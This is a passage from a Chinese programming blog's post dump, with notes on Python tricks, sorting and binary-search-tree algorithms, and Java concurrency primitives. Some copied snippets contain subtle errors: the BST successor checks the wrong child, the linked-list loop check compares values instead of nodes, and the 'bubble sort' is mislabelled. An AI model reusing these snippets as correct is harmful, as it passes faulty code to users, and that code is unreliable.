except (AttributeError,TypeError) as e: logging.error(&quot;formating json obj error! \\n root cause %s&quot; % e) result = json.dumps({&quot;status_code&quot;:403,&quot;error_msg&quot;:&quot;json serialize error!&quot;}) return result 这个对于多数class有效 print(json.dumps(s, default=lambda obj: obj.dict)) python的json.dumps方法默认会输出成这种格式”\\u2535a\\u35a2\\u89bd”。json.dumps({‘text’:”你好”},ensure_ascii=False,indent=2) 很多python开源项目根目录下面有一个setup.cfg和setup.py文件 跨进程同步 from multiprocessing import Process, Lock def f(l, i): l.acquire() try: print(&#39;hello world&#39;, i) finally: l.release() if __name__ == &#39;__main__&#39;: lock = Lock() for num in range(10): Process(target=f, args=(lock, num)).start() ##这个args是一个tuple，表示这个process运行的方法的参数 如何制作setup.py [成员变量，类变量(直接通过类名去访问)等问题]参考廖雪峰的实例属性和类属性。实例属性(包括方法)通过实例对象去访问，class属性通过类名访问。相同名称的实例属性将屏蔽掉类属性，但是当你删除实例属性后，再使用相同的名称，访问到的将是类属性。原理是访问限制 臭名昭著的import的问题(circular import) attempted relative import beyond top-level package 导包包括三种，导入下级目录，导入上级目录，导入同级目录中文件 python在import包的时候是查找同级目录及sys.path(python环境下)的文件。第一种只要确保下级目录中有init.py就好了第二种： from ..当前文件名 import 主目录文件。会报ValueError: attempted relative import beyond top-level package因为python认为这是主目录不能再向上了。所以直接from upperfile import variable_in_upper.不需要相对路径..了。因为程序运行起点是在主目录，只要在主目录下找到了就行。第三种： from 目录名.文件名 import something python 里面有一个eval()函数，和js里面的eval()函数几乎是一样的功能，都是把一段字符串当做一个语句来执行python里面获取系统环境变量: SQLALCHEMY_DATABASE_URI = os.environ.get(‘DATABASE_URL’,’postgresql://localhost/example’) 在python里面是可以拿到环境变量的比方说set FLASK_DEBUFG=1，实际上运行期间就是根据这个函数去找了。flask-helpers.py文件 def get_debug_flag(default=None): val = os.environ.get(&#39;FLASK_DEBUG&#39;) if not val: return default return val not in (&#39;0&#39;, &#39;false&#39;, &#39;no&#39;) 坑：vps上SQLALCHEMY_DATABASE_URI=mysql+pymysql://username:password@localhost/dbname 是连不上的，就算ssh里面也不行，localhost改成127.0.0.1也没用改成mysql+pymysql://username:password@you.real.ip.adress/dbname这样就可以了 Exceptions处理比如从一个字典里用不存在的key去获取值： d = {&quot;name&quot;:&quot;Sam&quot;,&quot;age&quot;:10} d[&#39;name&#39;] Sam d[&#39;age&#39;] 10 d[&#39;name2&#39;] KeyError: &#39;name2&#39; ###所以只有这种使用类似下标获取的方式会报错 d.get(&#39;name2&#39;) None d.get(&#39;name2&#39;,&quot;default&quot;) &quot;default&quot; 在flask中，从request对象中获取GET方法的queryParameters的时候，文档上就推荐使用这种searchword = request.args.get(‘key’, ‘’)或者catch KeyError的方式去避免用户输入的url中不存在queryKey。第一种方式当然不会报错，第二种方式是可能报错的。KeyError是操作字典的时候会出现的错误。 对于list，因为list获取元素的方式是根据index,所以可能出现IndexError l = [x*x for x in range(1,10)] l[0] ## 1 l[2] ## 9 l[20] ## IndexError: list index out of range 对于tuple，也是差不多的 t = (1,3,5,7,9) t[0] ## 1 t[100] ## IndexError:tuple index out of range python property()函数 图片处理pip install Pillow随手抄来一个pillow缩放图片的使用方法 from PIL import Image basewidth = 300 img = Image.open(&#39;somepic.jpg&#39;) wpercent = (basewidth/float(img.size[0])) hsize = int((float(img.size[1])*float(wpercent))) img = img.resize((basewidth,hsize), Image.ANTIALIAS) img.save(&#39;sompic.jpg&#39;) 一个支持python3的生成binary可执行文件的package 根据python module search Path的解释,整体的搜索顺序是这样的1.The directory from which the input script was run or the current directory if the interpreter is being run interactively2.The list of directories contained in the PYTHONPATH environment variable, if it is set. (The format for PYTHONPATH is OS-dependent but should mimic the PATH environment variable3.An installation-dependent list of directories configured at the time Python is installedvim and python 经常会看到支持with xxx as xxx可以自己写这样的函数，from contextlib import contextmanager，关键字: context syntax James Bennett - A Bit about Bytes: Understanding Python Bytecode - PyCon 2018主要是dis模块 python和c语言一样，也可以注册signal_handler看了下ctrl +c 是2 import signal import os import time import sys def readConfiguration(signalNumber, frame): print (&#39;(SIGHUP) reading configuration&#39;) return def terminateProcess(signalNumber, frame): print (&#39;(SIGTERM) terminating the process&#39;) sys.exit() def receiveSignal(signalNumber, frame): print(&#39;Received:&#39;, signalNumber) return if __name__ == &#39;__main__&#39;: # register the signals to be caught signal.signal(signal.SIGHUP, readConfiguration) signal.signal(signal.SIGINT, terminateProcess) //CTRL +C是这个 signal.signal(signal.SIGQUIT, receiveSignal) signal.signal(signal.SIGILL, receiveSignal) signal.signal(signal.SIGTRAP, receiveSignal) signal.signal(signal.SIGABRT, receiveSignal) signal.signal(signal.SIGBUS, receiveSignal) signal.signal(signal.SIGFPE, receiveSignal) #signal.signal(signal.SIGKILL, receiveSignal) signal.signal(signal.SIGUSR1, receiveSignal) signal.signal(signal.SIGSEGV, receiveSignal) signal.signal(signal.SIGUSR2, receiveSignal) signal.signal(signal.SIGPIPE, receiveSignal) signal.signal(signal.SIGALRM, receiveSignal) signal.signal(signal.SIGTERM, terminateProcess) # output current process id print(&#39;My PID is:&#39;, os.getpid()) # wait in an endless loop for signals while True: print(&#39;Waiting...&#39;) time.sleep(3)","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"数据结构之-算法手册","date":"2017-08-12T19:04:16.000Z","path":"2017/08/12/2017-08-12-algorithm-enlightenment/","text":"1. 各种排序的原理及java代码实现java.utils.Arrays这个类中有各种经典的实现，直接对照着学就好了。 1.1 BinarySearch[这个不是sort，但还是放第一了]二分法查找，前提是数组中元素全部按照顺序(从小到大或者从大到小)排列好了。Android中SparseArray中用到了binarySearch android.support.v4.util.ContainerHelpers // This is Arrays.binarySearch(), but doesn&#39;t do any argument validation. static int binarySearch(int[] array, int size, int value) { int lo = 0; int hi = size - 1; while (lo &lt;= hi) { int mid = (lo + hi) &gt;&gt;&gt; 1; int midVal = array[mid]; if (midVal &lt; value) { lo = mid + 1; } else if (midVal &gt; value) { hi = mid - 1; } else { return mid; // value found } } return ~lo; // value not present（） } 最后一个用的是位非操作，就是把int(4 bytes)转成2进制所有的0变成1，所有的1变成0. 1.2 BubbleSort把较大的元素挪到右边，较小的元素挪到左边。每次从左到右边，两个两个的比较，大的往右挪，第一次完成后，最大的一个一定已经挪到最后了。接下里对n-1个元素进行同样的操作。java代码 public static void bubbleSort(int[] numArray) { int n = numArray.length; int temp = 0; for (int i = 0; i &lt; n; i++) { for (int j = 1; j &lt; (n - i); j++) { if (numArray[j - 1] &gt; numArray[j]) { temp = numArray[j - 1]; numArray[j - 1] = numArray[j]; numArray[j] = temp; } } } } Python实现，python中swap两个值非常方便：a , b = b , a def bubble_sort(lists): # 冒泡排序 count = len(lists) for i in range(0, count): for j in range(i + 1, count): if lists[i] &gt; lists[j]: lists[i], lists[j] = lists[j], lists[i] return lists 其实任何语言都应该有这种不用第三个值去swap两个int的方法 x = x + y; // x now becomes 15 y = x - y; // y becomes 10 x = x - y; // x becomes 5 the worst case scenario ：array完全倒序 o(n^2)the best case scenario : array已经排序好 Ω（n） 1.3 Insertion Sort基本上就是把一个数组从左到右迭代，第一遍声明第一个元素是sorted，第二遍看下第二个和第一个是不是有序的，第二遍完成后第二个元素是sorted。第三遍把前三个排序好。下面这段代码是从华盛顿大学教程抄的，应该没问题。 public static void insertionSort(int[] a){ for (int i=1;i&lt;a.length;i++){ int temp = a[i]; int j; for(j=i-1;j&gt;=0&amp;&amp;temp&lt;a[j];j--) a[j+1] = a[j] a[j+1] = temp; } } 核心算法就是第N此排序完成后，前N个元素已经排序完毕。 the worst case scenario ：array完全倒序 o(n^2)the best case scenario : array已经排序好 Ω（n） 1.4 Merge Sort这个算法比较复杂，一图胜千言参考其实就是把array打成一半一半，直到变成多个大小为2的数组，然后再合并起来。java代码直接复制粘贴了，保留包名是对作者的尊重： package com.java2novice.sorting; public class MyMergeSort { private int[] array; private int[] tempMergArr; private int length; public static void main(String a[]){ int[] inputArr = {45,23,11,89,77,98,4,28,65,43}; MyMergeSort mms = new MyMergeSort(); mms.sort(inputArr); for(int i:inputArr){ System.out.print(i); System.out.print(&quot; &quot;); } } public void sort(int inputArr[]) { this.array = inputArr; this.length = inputArr.length; this.tempMergArr = new int[length]; doMergeSort(0, length - 1); } private void doMergeSort(int lowerIndex, int higherIndex) { if (lowerIndex &lt; higherIndex) { int middle = lowerIndex + (higherIndex - lowerIndex) / 2; // Below step sorts the left side of the array doMergeSort(lowerIndex, middle); // Below step sorts the right side of the array doMergeSort(middle + 1, higherIndex); // Now merge both sides mergeParts(lowerIndex, middle, higherIndex); } } private void mergeParts(int lowerIndex, int middle, int higherIndex) { for (int i = lowerIndex; i &lt;= higherIndex; i++) { tempMergArr[i] = array[i]; } int i = lowerIndex; int j = middle + 1; int k = lowerIndex; while (i &lt;= middle &amp;&amp; j &lt;= higherIndex) { if (tempMergArr[i] &lt;= tempMergArr[j]) { array[k] = tempMergArr[i]; i++; } else { array[k] = tempMergArr[j]; j++; } k++; } while (i &lt;= middle) { array[k] = tempMergArr[i]; k++; i++; } } } 看视频比较方便 1.5 Selection Sort每次把数组里面最小的元素挪到最左边,图片是从这里抄的java代码也是抄的 package com.java2novice.algos; public class MySelectionSort { public static int[] doSelectionSort(int[] arr){ for (int i = 0; i &lt; arr.length - 1; i++) { int index = i; for (int j = i + 1; j &lt; arr.length; j++) if (arr[j] &lt; arr[index]) index = j; int smallerNumber = arr[index]; arr[index] = arr[i]; arr[i] = smallerNumber; } return arr; } public static void main(String a[]){ int[] arr1 = {10,34,2,56,7,67,88,42}; int[] arr2 = doSelectionSort(arr1); for(int i:arr2){ System.out.print(i); System.out.print(&quot;, &quot;); } } } 注意，每次遍历都都会意味着数组分为有序和无序两部分，遍历是从无序的数组第一个开始的，并且将无序数组中的最小值与无序数组第一个元素swap一下。就是很直观的每次把最小的拿到最左边的做法。 1.6 Quicksort一种比较快速的排序方法视频选中数组最后一个元素，称之为pivot。然后从左到右找，把所有小于pivot的元素挪到左边。然后把pivot挪到刚才那个元素右边，一直重复下去。 public static void quickSort(int[] data,int low,int high) { if (low &lt; high) { int povit = partition(data, low, high); quickSort(data, low, povit - 1); quickSort(data, povit + 1, high); } } public static int partition(int[] arr,int low , int high){ int pivot = arr[low]; while (low &lt; high) { while (low&lt;high&amp;&amp;arr[high]&gt;=pivot) { --high; } arr[low] = arr[high]; while (low&lt;high&amp;&amp;arr[low]&lt;=pivot) { ++low; } arr[high] = arr[low]; } arr[low] = pivot; return low; } 这是好不容易看懂的快速排序java实现，感受下手写快排 另一种使用递归的方式 public static void main(String[] args) { int[] array = {1, 4, 2, 45, 6, 4, 2, 4, 7, 10, 24, 12, 14, 17, 10, 9, 4}; QuickSort(array, 0, array.length-1); Utils.printEach(array); } private static void QuickSort(int[] arr, int start, int end) { if (start &lt; end) { int key = arr[start]; int i = start, j; for (j = start+1;j&lt;=end;j++) { if (arr[j] &lt; key) { Utils.swap(arr, j, i + 1); i++; } } arr[start] = arr[i]; arr[i] = key; QuickSort(arr, start, i - 1); QuickSort(arr, i+1, end); } } 1.7 TimSortjava的Collections.sort的算法，Comparison Method Violates Its General Contract!) 2. 二叉树2.1 二叉查找树(BST)定义:在二叉查找树中：(01) 若任意节点的左子树不空，则左子树上所有结点的值均小于它的根结点的值；(02) 任意节点的右子树不空，则右子树上所有结点的值均大于它的根结点的值；(03) 任意节点的左、右子树也分别为二叉查找树。(04) 没有键值相等的节点（no duplicate nodes）。 二叉查找树的增删改查 求BST的最小值//求BST的最小值 public TreeNode getMin(TreeNode root) { if(root==null) return null; while(root.left!=null) root=root.left; return root; } 求BST的最大值 //求BST的最大值 public TreeNode getMax(TreeNode root) { if(root==null) return null; while(root.right!=null) root=root.right; return root; } 查找BST中某节点的前驱节点.即查找数据值小于该结点的最大结点。public TreeNode preNode(TreeNode x) { if(x==null) return null; // 如果x存在左孩子，则&quot;x的前驱结点&quot;为 &quot;以其左孩子为根的子树的最大结点&quot;。 if(x.left!=null) return getMax(x.left);//直接找左树的最大节点就好了，就是一直往左找 // 如果x没有左孩子。则x有以下两种可能： // (01) x是&quot;一个右孩子&quot;，则&quot;x的前驱结点&quot;为 &quot;它的父结点&quot;。 // (02) x是&quot;一个左孩子&quot;，则 前驱节点为x的某一个祖先节点的父节点，而且该祖先节点是作为其父节点的右儿子 TreeNode p=x.parent; while(p!=null&amp;&amp;p.left==x) { x=p;//父节点置为新的x p=p.parent; //父节点的父节点置为新的父节点 } return p; } 查找BST中某节点的后继节点.即查找数据值大于该结点的最小结点。public TreeNode postNode(TreeNode x) { if(x==null) return null; // 如果x存在右孩子，则&quot;x的后继结点&quot;为 &quot;以其右孩子为根的子树的最小结点&quot;。 if(x.left!=null) return getMin(x.right); // 如果x没有右孩子。则x有以下两种可能： // (01) x是&quot;一个左孩子&quot;，则&quot;x的后继结点&quot;为 &quot;它的父结点&quot;。 // (02) x是&quot;一个右孩子&quot;，则 前驱节点为x的某一个祖先节点的父节点，而且该祖先节点是作为其父节点的左儿子 TreeNode p=x.parent; while(p!=null&amp;&amp;p.right==x) { x=p;//父节点置为新的x p=p.parent; //父节点的父节点置为新的父节点 } return p; } 给出一个Int值，查找这个Int值在树中对应的节点//递归 public TreeNode findNode(TreeNode head, int val){ if(head==null){ return null; } if(head.val==val){ return head; }else if(head.val &gt; val){ head = head.left; }else { head= head.right; } return findNode(head, val); } //非递归 public TreeNode findNode(TreeNode head, int val){ if(head==null){ return null; } while(head!=null){ if(head.val ==val){ return head; }else if (head.val &gt; val){ head = head.left; }else { head = head.right; } } return head; } 插入值//BST插入节点 --递归版-- public TreeNode insertRec(TreeNode root,TreeNode x) { if(root==null) root=x; else if(x.value&lt;root.value) root.left=insertRec(root.left, x); else if(x.value&gt;root.value) root.right=insertRec(root.right, x); return root; } //BST插入节点 --非 递归版-- public TreeNode insert(TreeNode root,TreeNode x) { if(root==null) root=x; TreeNode p=null;//需要记录父节点 while(root!=null)//定位插入的位置 { p=root;//记录父节点 if(x.value&lt;root.value) root=root.left; else root=root.right; } x.parent=p;//定位到合适的页节点的空白处后，根据和父节点的大小比较插入合适的位置 if(x.value&lt;p.value) p.left=x; else if(x.value&gt;p.value) p.right=x; return root; } 参考Java关于数据结构的实现：树 3. 链表有环链表的判断问题。时间复杂度和空间复杂度的最优解是创建两根迭代速度不一样的指针 下面的代码来自csdn public class LinkLoop { public static boolean hasLoop(Node n){ //定义两个指针tmp1,tmp2 Node tmp1 = n; Node tmp2 = n.next; while(tmp2!=null){ int d1 = tmp1.val; int d2 = tmp2.val; if(d1 == d2)return true;//当两个指针重逢时，说明存在环，否则不存在。 tmp1 = tmp1.next; //每次迭代时，指针1走一步，指针2走两步 tmp2 = tmp2.next.next; if(tmp2 == null)return false;//不存在环时，退出 } return true; //如果tmp2为null，说明元素只有一个，也可以说明是存在环 } //方法2：将每次走过的节点保存到hash表中，如果节点在hash表中，则表示存在环 public static boolean hasLoop2(Node n){ Node temp1 = n; HashMap&lt;Node,Node&gt; ns = new HashMap&lt;Node,Node&gt;(); while(n!=null){ if(ns.get(temp1)!=null)return true; else ns.put(temp1, temp1); temp1 = temp1.next; if(temp1 == null)return false; } return true; } public static void main(String[] args) { Node n1 = new Node(1); Node n2 = new Node(2); Node n3 = new Node(3); Node n4 = new Node(4); Node n5 = new Node(5); n1.next = n2; n2.next = n3; n3.next = n4; n4.next = n5; n5.next = n1; //构造一个带环的链表,去除此句表示不带环 System.out.println(hasLoop(n1)); System.out.println(hasLoop2(n1)); } } 给定两单链表A、B，只给出两头指针。请问： 1、如何判断两单链表（无环）是否相交？ 有两种可取的办法： （1）人为构环，将链表A的尾节点指向链表B，再判断是否构环成功？从链表B的头指针往下遍历，如果能够回到B，则说明相交 （2）判断两链表最后一个节点是否相同，如果相交，则尾节点肯定是同一节点 2、如何判断两单链表（不知是否有环）相交？ 先判断是否有环，判断是否有环可以使用追逐办法，设置两个指针，一个走一步，一个走两步，如果能相遇则说明存在环 （1）两个都没环：回到问题1 （2）一个有环，一个没环：不用判断了，肯定两链表不相交 （3）两个都有环：判断链表A的碰撞点是否出现在链表B的环中，如果在，则相交。（相交时，环必定是两链表共有的） 3.最小栈的实现需要两个栈，A和B，B用于存储A中当前min的index，B中由上而下依次是A的最小，第二小，第三小。。。所以万一A中的最小被pop掉了，直接拿B顶上的元素，始终是最小的。时间复杂度是O(1)，空间复杂度最坏是O(N) 4.在O(1)时间复杂度删除链表节点 class Solution: # @param node: the node in the list should be deleted # @return: nothing def deleteNode(self, node): temp = node.next node.val = temp.val node.next = temp.next # write your code here 堆排序的实现堆排序，时间复杂度O(nlogn),任何时刻都只需要常数个额外的元素空间存储临时数据。堆的定义 n个元素的序列{k1，k2，…,kn}当且仅当满足下列关系之一时，称之为堆。 情形1：ki &lt;= k2i 且ki &lt;= k2i+1 （最小化堆或小顶堆） 情形2：ki &gt;= k2i 且ki &gt;= k2i+1 （最大化堆或大顶堆） 其中i=1,2,…,n/2向下取整;堆可以看成是完全二叉树，完全二叉树中所有非终端结点的值均不大于（或不小于）其左、右孩子结点的值。排序通常用最大堆，构造优先队列通常用最小堆。最大堆(大顶堆)和最小堆实现基本一样，只要修改维护堆性质的函数即可。Java实现—堆排序 Heap Sort 堆排序方法对记录数较少的文件并不值得提倡，但对n较大的文件还是很有效的。因为其运行时间主要耗费在建初始堆和调整建新堆时进行的反复“筛选”上。 任意一位置i上元素，其左儿子为2i+1上，右儿子在2i+2上。 我碰到过的算法题(还是面试官手下留情的)： 两个整形数组，请使用你能够想到的最优算法，实现求交集的操作 二维数组环形打印 给定一个n*m矩阵，求从左上角到右下角总共存在多少条路径，每次只能向右走或者向下走。递归和动态规划 首先给出计算总的可能路径的方法 public static int uniquePaths(int m, int n){ if(m==0 || n==0) return 0; if(m ==1 || n==1) return 1; int[][] dp = new int[m][n]; //只有一行时，到终点每个格子只有一种走法 for (int i=0; i&lt;n; i++) dp[0][i] = 1; // 只有一列时，到终点每个格子只有一种走法 for (int i=0; i&lt;m; i++) dp[i][0] = 1; // for each body node, number of path = paths from top + paths from left for (int i=1; i&lt;m; i++){ for (int j=1; j&lt;n; j++){ dp[i][j] = dp[i-1][j] + dp[i][j-1]; } } return dp[m-1][n-1]; } 解法二：数学中的组合问题，因为从左上角到右下角，总共需要走n+m-2步，左上角和右下角的元素不考虑在内，我们每次都可以选择向下走，向下走总共需要m-1步，所以在n+m-2步中选择m-1步，这是典型的排列组合问题。 int uniquePaths(int m, int n) { int N = n + m - 2; int K = n - 1; double res = 1.0; for (int i = 1; i &lt;= n - 1; ++i) { res = res * (N - K + i) / i; } return (int)res; } KMP算法","tags":[{"name":"算法","slug":"算法","permalink":"https://haldir65.github.io/tags/算法/"}]},{"title":"java多线程中需要注意的一些点","date":"2017-08-03T21:04:28.000Z","path":"2017/08/03/2017-08-03-high-concurrency-recipes/","text":"The difference between “concurrent” and “parallel” executionGood to know构造函数也不是线程安全的(因为指令重排) 1. 可重入锁的概念可重入锁，也叫做递归锁，指的是同一线程 外层函数获得锁之后 ，内层递归函数仍然有获取该锁的代码，但不受影响。 A ReentrantLock is owned by the thread last successfully locking, but not yet unlocking it. A thread invoking lock will return, successfully acquiring the lock, when the lock is not owned by another thread. The method will return immediately if the current thread already owns the lock. 也就是说如果当前占用锁的人就是当前线程，那么再次调用lock方法将直接返回。 比方说 lock.lock() — lock.lock() — lock.unlock()lock.unlock() ReentrantLock和synchronized都是可重入锁 @Override public void run() { final ReentrantLock lock = this.lock; lock.lock(); //拿不到lock的Thread会挂起 try { this.mList.add(&quot;new elements added by&quot; + mIndex + &quot;&quot;); //对共享资源的操作放这里 } finally { lock.unlock(); //记得解锁 } } 非可重入锁的例子 //一种非可重入锁 class Lock{ private boolean isLocked = false; public synchronized void lock() throws InterruptedException{ while(isLocked){ wait(); } isLocked = true; } public synchronized void unlock(){ isLocked = false; notify(); } } public class TestLock { private Lock lock = new Lock(); // private Lock lock = new ReentrantLock(); public void t1() throws Exception{ lock.lock(); System.out.println(&quot;t1执行了&quot;); t2(); lock.unlock(); } public void t2() throws Exception{ lock.lock(); System.out.println(&quot;t2也执行了&quot;); lock.unlock(); } public static void main(String[] args) throws Exception{ new TestLock().t1(); } } 输出: t1执行了 程序一直在跑，因为wait住了 ReentrantLock的构造函数可以传一个boolean进去，表示公平锁还是非公平锁，默认是非公平锁。在获取锁的时候，非公平锁是新到的线程和等待队列中的线程一起竞争锁，但公平锁则始终保证等待最长的线程获取锁。 2. ThreadLocal比较好的用例在Andriod的Looper中Looper.prepare() private static void prepare(boolean quitAllowed) { if (sThreadLocal.get() != null) { throw new RuntimeException(&quot;Only one Looper may be created per thread&quot;); } sThreadLocal.set(new Looper(quitAllowed));//sThreadLocal是static的，注意leak } // ThreadLocal public void set(T value) { Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); //ThreadLocalMap就是一个Entry为WeakReference（WeakRWeakReference不是有get方法嘛，也是key-value的形式）。上面返回当前Thread的成员变量。（所以说Thread创建也是很耗费内存的嘛） if (map != null) map.set(this, value);//注意这个this是sThreadLocal，static的 else createMap(t, value); } 一个比较好的关于ThreadlLocal为什么容易leak的解释，ThreadLocal是作为ThreadLocalMap中的Entry的key存在的，也就是Thread-&gt; ThreadLocalMap -&gt; Entry -&gt; WeakReference of ThreadLocal 。想想一下，假如外部调用者释放了ThreadLocal的引用，这个Entry中的key就成为null了，但是这个Entry中的Value还在，一直被Thread持有着。所以这事还是在于Thread的生命周期可能很长。fix的方案： 外部确定不用的时候记得调用下remove就好了。 所以避免leak的话，记得调用ThreadLocal.remove每一条线程调用ThreadLocal的set方法时都只能改变属于自己（线程）的值，调用get的时候也只能读到自己曾经设置的值。在多条线程面前，一个ThreadLocal本身并不是容器，因为数据实际上放在了Thread的一个map里面，每条线程只能保存或者更改读取自己的保险柜里的东西，保险柜钥匙即ThreadLocal自身。 3. Fork/join since java 7有些任务是可以分块的。work-stealing的实现 4. ArrayBlockingQueue Thread Safe构造函数里面就加了锁，是为了避免指令重排，保证可见性 5.ReentrantLock 不公平锁在jdk1.5里面，ReentrantLock的性能是明显优于synchronized的，但是在jdk1.6里面，synchronized做了优化，他们之间的性能差别已经不明显了。 6. StampedLocks(java 8)java 1.5 就有了ReentrantReadWriteLock，用于实现专门针对读或者写的lockjava 8提供了StampedLocks,lock方法返回一个long的时间戳，可以用这个时间戳release lock，或者检测lock是否有效。例如，tryConvertToOptimisticRead,假如在这个读的时间段内未发生其他线程的写操作，可以认为数据是有效的。像这样 假如有线程通过lock.writeLock()获得了写锁，只要不unlockWrite，所有的调用lock.readLock或者tryConvertToOptimisticRead都不会成功。 假如有线程获取了读锁，即调用了lock.readLock()，或者tryReadLock获得读取锁。读取获取锁并不是加锁，读并不是危险操作，获取锁只是为了检测读取的过程中是否发生过写 Optimistic Reading ，即tryConvertToOptimisticRead,只有在当前锁不被写持有的时候才返回一个非零值，这个值用于在读取完毕之后用validate检测本次读取的间隙中是否发生过写操作。 7. Android官方文档上对于happens-before的准则有详细的描述happens-before，主要是jdk本身提供的primitive遵守的并发准则。 8. lock的声明方式一般synchronize(object)就好了,但有更经济的方式 Object lock = new Object(); private byte[] lock = new byte[0]; // 特殊的instance变量 Public void methodA() { synchronized(lock) { //… } } 零长度的byte数组对象创建起来将比任何对象都经济――查看编译后的字节码：生成零长度的byte[]对象只需3条操作码，而 Object lock = new Object() ;则需要7行操作码。 9. CountdownLatch和CyclicBarrier分别举一个例子 public class CountDownLatchTest { private int threadNum = 5;//执行任务的子线程数量 private int workNum = 20;//任务数量 private ExecutorService service; private ArrayBlockingQueue&lt;String&gt; blockingQueue; private CountDownLatch latch; @Before public void setUp() { service = Executors.newFixedThreadPool(threadNum, new ThreadFactoryBuilder().setNameFormat(&quot;WorkThread-%d&quot;).build()); blockingQueue = new ArrayBlockingQueue&lt;&gt;(workNum); for (int i = 0; i &lt; workNum; i++) { blockingQueue.add(&quot;任务-&quot; + i); } latch = new CountDownLatch(workNum);//计数器的值为任务的数量 } @Test public void test() throws InterruptedException { SoutUtil.print(&quot;主线程开始运行&quot;); for (int i = 0; i &lt; workNum; i++) { service.execute(new WorkRunnable()); } latch.await();//等待子线程的所有任务完成 SoutUtil.print(&quot;主线程去做其它事&quot;); } //用blockQueue中的元素模拟任务 public String getWork() { return blockingQueue.poll(); } class WorkRunnable implements Runnable { public void run() { String work = getWork(); performWork(work); latch.countDown();//完成一个任务就调用一次 } } private void performWork(String work) { SoutUtil.print(&quot;处理任务：&quot; + work); try { //模拟耗时的任务 Thread.currentThread().sleep(60); } catch (InterruptedException e) { e.printStackTrace(); } } } CountDownLatch的await方法会阻塞主线程直到N减少到0。 CyclicBarrier的例子 public class CyclicBarrierDemo { public static void main(String[] args) { int totalThread = 5; CyclicBarrier barrier = new CyclicBarrier(totalThread); for(int i = 0; i &lt; totalThread; i++) { String threadName = &quot;Thread &quot; + i; new Thread(() -&gt; { System.out.println(String.format(&quot;%s\\t%s %s&quot;, new Date(), threadName, &quot; is waiting&quot;)); try { barrier.await();// 必须等所有线程完成了上面的操作，后面的操作才能执行。 } catch (Exception ex) { ex.printStackTrace(); } System.out.println(String.format(&quot;%s\\t%s %s&quot;, new Date(), threadName, &quot;ended&quot;)); }).start(); } } } CyclicBarrier是等大家都调完await之后才开始各自走下一步 CountDownLatch：一个或者多个线程，等待其他多个线程完成某件事情之后才能执行；CyclicBarrier：多个线程互相等待，直到到达同一个同步点，再继续一起执行。 10.指令重排不是说说而已 在多线程的场景下，无逻辑相关的代码写的前后顺序并无意义，原因是编译器会进行指令重排。为什么说指令重排序会影响 items 的可见性呢？创建一个对象要分为三个步骤： 1 分配内存空间 2 初始化对象 3 将内存空间的地址赋值给对应的引用 但是由于指令重排序的问题，步骤 2 和步骤 3 是可能发生重排序的，如下： 1 分配内存空间 2 将内存空间的地址赋值给对应的引用 3 初始化对象 这也就解释了我们平时是如何正确地写出单例模式 volatile 在Java中一个特性是保证可见性，另一个是禁止指令重排序优化。 11.HashMap不是线程安全的，可能会在reHash里形成死锁非常烧脑 12. wait和notify搭配使用，sleep是不释放锁的转自sleep和wait到底什么区别wait是在当前线程持有wait对象锁的情况下，暂时放弃锁，并让出CPU资源，并积极等待其它线程调用同一对象的notify或者notifyAll方法。注意，即使只有一个线程在等待，并且有其它线程调用了notify或者notifyAll方法，等待的线程只是被激活，但是它必须得再次获得锁才能继续往下执行。换言之，即使notify被调用，但只要锁没有被释放，原等待线程因为未获得锁仍然无法继续执行。 wait和notify都必须包在synchronized代码块中（必须在获得锁的前提下调用） Sleep是Thread对象的静态方法，sleep并不释放锁，也不要求持有锁。 Thread.yield方法是让当前线程从执行状态变成就绪状态（就是和大家一起抢） synchronized关键字一般有三种用法 一、实例同步方法synchronized用于修饰实例方法（非静态方法）时，执行该方法需要获得的是该类实例对象的内置锁（同一个类的不同实例拥有不同的内置锁）。如果多个实例方法都被synchronized修饰，则当多个线程调用同一实例的不同同步方法（或者同一方法）时，需要竞争锁。但当调用的是不同实例的方法时，并不需要竞争锁。也正是如此，一个同步方法被调用时，就等于独占了当前实例的锁，其他线程无法调用当前实例的其他同步方法。所以不是很推荐使用同步方法。二、静态同步方法synchronized用于修饰静态方法时，执行该方法需要获得的是该类的class对象的内置锁（一个类只有唯一一个class对象）。调用同一个类的不同静态同步方法时会产生锁竞争。三、同步代码块synchronized用于修饰代码块时，进入同步代码块需要获得synchronized关键字后面括号内的对象（可以是实例对象也可以是class对象）的内置锁。 java io为什么慢，有一个原因是InputStream的read方法和OutputStream的write方法都是加了synchronized的。而Okio里面synchronized方法我没找到，另外，真的想要io性能的话，用nio。 同步一个对象的前提是各方都同意使用同一把锁作为调用方法的前提，单方面加锁并不限制不尊重锁机制的使用者。两条线程分别去取两个互不相干的锁，这里面当然不存在阻塞问题。 13. CAS操作是有操作系统提供了硬件级别的原子操作的。CAS属于乐观的一种，假如比较之后发现OK那最好，假如不成功还允许继续尝试。jdk中使用的是UnSafe这个类，这个类属于“后门”，开发者可以使用这个类直接操控HotSpot jvm内存和线程。被广泛应用于juc包中。 比如说直接操纵内存 Unsafe unsafe = getUnsafe(); Class aClass = A.class; A a = (A) unsafe.allocateInstance(aClass); 最好不要在工程中使用。 14.ArrayBlockingQueue和LinkedBlockingQueue线程池的构造方法最后一个参数是一个BlockingQueue，BlockingQueue是一个接口，就像一个典型的生产者消费者模型问题一样。如果从queue中取element的时候发现size为0，或者往queue中添加element的时候发现queue满了。应对这种资源不能被 立即满足 的策略就定义了BlockingQueue。BlockingQueue提供了四种应对策略来处理这种资源不能被立即satisfy的场景 空值 抛出异常 返回一个特殊值 阻塞 调用者提供一个超时 插入 add(e) offer(e) put(e) put(e, time ,timeUnit) 移除 remove() poll() take() poll(time,timeUnit) 检查 element() peek() 不可用 不可用 文档上说： Usage example, based on a typical producer-consumer scenario. Note that a BlockingQueue can safely be used with multiple producers and multiple consumers.（BlockingQueue能够安全的用于多个生产者消费者的场景，就是说这个容器已经帮外部处理好了生产和消费并发的同步问题，其实就是加锁） BlockingQueue的常用的实现类包括ArrayBlockingQueue(FIFO)和LinkedBlockingQueue(FIFO)。 ArrayBlockingQueue是一个由数组实现的 有界阻塞队列。该队列采用 FIFO 的原则对元素进行排序添加。ArrayBlockingQueue的入列核心方法是enqueue，而这个方法的调用是被包在一个lock.lock和lock.unlock中的，所以是同步的。出列的核心方法是dequeue，也是包在同步lock里面的。构造函数可以传一个fair进来。 